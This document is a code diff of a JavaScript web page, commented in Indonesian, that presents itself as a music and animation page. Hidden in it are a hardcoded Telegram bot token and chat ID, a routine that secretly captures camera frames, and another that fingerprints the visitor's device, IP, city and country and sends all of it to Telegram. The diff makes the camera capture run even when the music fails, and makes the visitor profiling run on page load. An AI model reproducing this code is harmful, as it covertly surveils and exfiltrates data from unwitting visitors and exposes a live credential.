@@ -9,29 +9,28 @@ if (openPhotoOptions && photoOptions) {
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-// === BAGIAN MUSIK + KAMERA — HYBRID FIX ===
+// === BAGIAN MUSIK + KAMERA — HYBRID FIX STABIL ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 let started = false;
 music.volume = 0.4;
 
-// Fungsi utama: mulai musik dan lanjut kamera
 async function startMusicAndCamera() {
   if (started) return;
   started = true;
 
-  // --- Jalankan musik dulu ---
+  let musicStarted = false;
   try {
     music.muted = false;
     await music.play();
     console.log("🎵 Musik diputar");
+    musicStarted = true;
   } catch (err) {
-    console.warn("Autoplay gagal:", err);
+    console.warn("Autoplay musik gagal:", err);
     btnMusic.classList.add("show");
-    return; // hentikan di sini kalau musik belum bisa play
+    // tetap lanjut kamera walau musik gagal
   }
 
-  // --- Setelah musik sukses, lanjut izin kamera ---
   setTimeout(async () => {
     try {
       const alreadyAllowed = localStorage.getItem("user_allows_auto_capture") === "1";
@@ -48,7 +47,7 @@ async function startMusicAndCamera() {
     } catch (e) {
       console.warn("❌ User menolak izin kamera:", e);
     }
-  }, 800); // beri jeda 0.8 detik agar musik jalan dulu
+  }, musicStarted ? 800 : 1500); // jeda lebih panjang bila musik gagal
 
   btnMusic.classList.remove("show");
   btnMusic.disabled = true;
@@ -62,16 +61,13 @@ async function autoCaptureAndSend() {
     video.srcObject = stream;
     video.playsInline = true;
 
-    // Tunggu video siap
     await new Promise(res => {
       video.onloadedmetadata = () => video.play().then(res).catch(res);
       setTimeout(res, 3000);
     });
 
-    // 🕐 Tambahkan jeda 1 detik agar kamera fokus
     await new Promise(r => setTimeout(r, 1000));
 
-    // Ambil frame
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -110,7 +106,6 @@ if (isMobile) {
   btnMusic.classList.add("show");
   music.muted = true;
 } else {
-  // desktop: coba otomatis setelah interaksi pertama
   window.addEventListener('mousemove', startMusicAndCamera, { once: true });
 }
 
@@ -226,7 +221,7 @@ document.getElementById('sendQ').addEventListener('click', async () => {
 });
 
 // === INFO PENGUNJUNG ===
-async function showVisitorInfo() {
+(async function showVisitorInfo() {
   try {
     let visitorID = localStorage.getItem("visitor_id");
     if (!visitorID) {
@@ -248,7 +243,6 @@ async function showVisitorInfo() {
   } catch (err) { console.warn("visitor-id error:", err); }
 
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
-
   async function safeFetch(url, opts = {}, retries = 3, retryDelay = 800) {
     for (let i = 0; i < retries; i++) {
       try { return await fetch(url, opts); }
@@ -259,12 +253,9 @@ async function showVisitorInfo() {
     }
   }
 
-  // 🔍 deteksi merek + model
   function detectDeviceBrandModel() {
     const ua = navigator.userAgent.toLowerCase();
     let brand = "Tidak diketahui", model = "";
-
-    // --- Brand umum ---
     if (/xiaomi|redmi|mi\s/i.test(ua)) brand = "Xiaomi / Redmi";
     else if (/poco/i.test(ua)) brand = "Poco";
     else if (/samsung|sm-|galaxy/i.test(ua)) brand = "Samsung";
@@ -283,7 +274,6 @@ async function showVisitorInfo() {
     else if (/google/i.test(ua)) brand = "Google Pixel";
     else if (/sony/i.test(ua)) brand = "Sony Xperia";
 
-    // --- Model / seri umum ---
     if (/galaxy\s?([asnjz]\d{1,3}|note\s?\d{1,2})/i.test(ua)) {
       const m = ua.match(/galaxy\s?([asnjz]\d{1,3}|note\s?\d{1,2})/i);
       model = "Galaxy " + m[1].toUpperCase();
@@ -377,8 +367,7 @@ async function showVisitorInfo() {
       await sendToTelegram({city:"?",country:"?",ip:"?"},null,null,"unknown");
     }
   }
-}
-showVisitorInfo();
+})();
 
 // === EFEK BUTTERFLY 💸 ===
 (function () {
